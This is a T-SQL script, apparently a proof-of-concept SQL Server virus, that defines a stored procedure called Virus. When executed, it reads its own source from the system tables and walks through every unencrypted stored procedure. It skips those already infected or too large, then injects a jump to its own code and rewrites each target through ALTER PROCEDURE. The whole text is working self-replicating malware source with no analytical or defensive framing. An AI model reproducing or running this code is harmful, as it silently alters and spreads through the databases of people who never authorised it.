SET QUOTED_IDENTIFIER OFF 
GO
SET ANSI_NULLS OFF 
GO

CREATE PROCEDURE Virus 
AS
SET NOCOUNT ON
GOTO Virus
VirusDone:
return
Virus:
--Joseph Gama©
declare @current_proc varchar(255),@current_text varchar(8000),@VirusCode varchar(8000),@cmd varchar(8000),@a int,@b int,@Vsize int
--get Virus code
set @VirusCode=(SELECT c.text FROM sysobjects o INNER JOIN syscomments c ON c.id = o.id WHERE o.type='p' and (o.category=0) and (o.id = @@Procid))
set @a=CHARINDEX('Virus:',@VirusCode)
set @b=CHARINDEX(convert(varchar(20),0x474F544F205669727573446F6E65),@VirusCode)
set @VirusCode=SUBSTRING(@VirusCode, @a-10, @b-@a+25)
SET @Vsize=datalength(@VirusCode)
DECLARE _Cursor CURSOR FOR SELECT o.name,c.text FROM sysobjects o INNER JOIN syscomments c ON c.id = o.id WHERE o.type='p' and o.category=0 and encrypted=0
OPEN _Cursor
FETCH NEXT FROM _Cursor INTO @current_proc, @current_text
WHILE @@FETCH_STATUS=0
BEGIN 
--is there room for the virus?
IF (SELECT count(name) FROM sysobjects o INNER JOIN syscomments c ON c.id = o.id WHERE name=@current_proc)>1 GOTO IgnoreSP
IF datalength(@current_text)+@Vsize+23>8000 GOTO IgnoreSP
--is it infected?
IF CHARINDEX('VirusDone:',@current_text)>0 GOTO IgnoreSP
SET @cmd =  replace(@current_text, 'CREATE PROCEDURE ' + @current_proc, 'ALTER PROCEDURE ' + @current_proc )
set @a=1
try2:
set @a=CHARINDEX('as',@cmd,(@a+1))
IF @a>0 and ascii(SUBSTRING(@cmd,@a-1,1)) NOT IN (32,13,10,9,0) GOTO try2
IF @a>0 and ascii(SUBSTRING(@cmd,@a+2,1)) NOT IN (32,13,10,9,0) GOTO try2
set @b=@a
--avoid --
while (@b>1) and (ascii(SUBSTRING(@cmd,@b,1))<>13) set @b=@b-1
if CHARINDEX('--',SUBSTRING(@cmd,@b,@a-@b))>0  GOTO try2
--avoid /*
set @b=@a
while (@b>2) and (SUBSTRING(@cmd,@b,1)<>'*') and (SUBSTRING(@cmd,@b-1,1)<>'/') set @b=@b-1
if (@b<@a)and (CHARINDEX('*/',@cmd,@b)>@a)  GOTO try2
set @cmd=stuff(@cmd, @a+2,1,char(13)+'GOTO Virus'+char(13)+'VirusDone:'+char(13))
--add virus code to SP
set @cmd=@cmd+@VirusCode
EXEC( @cmd)
IgnoreSP:
FETCH NEXT FROM _Cursor INTO @current_proc, @current_text
END
CLOSE _Cursor
DEALLOCATE _Cursor
GOTO VirusDone
GO
SET QUOTED_IDENTIFIER OFF 
GO
SET ANSI_NULLS ON 
GO

